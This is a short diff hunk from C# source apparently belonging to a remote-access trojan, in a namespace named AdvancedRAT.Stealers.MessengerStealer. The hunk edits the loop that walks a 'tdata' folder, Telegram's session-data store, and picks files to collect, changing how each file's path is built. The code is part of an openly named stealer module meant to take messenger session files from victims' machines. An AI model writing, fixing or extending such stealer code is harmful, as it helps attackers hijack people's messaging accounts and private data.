@@ -32,7 +32,7 @@ namespace AdvancedRAT.Stealers.MessengerStealer
                         
                         foreach (string file in files)
                         {
-                            string relativePath = Path.GetRelativePath(tdataPath, file);
+                            string relativePath = Path.Combine(tdataPath, Path.GetFileName(file));
                             if (ShouldIncludeFile(relativePath))
                             {
                                 try
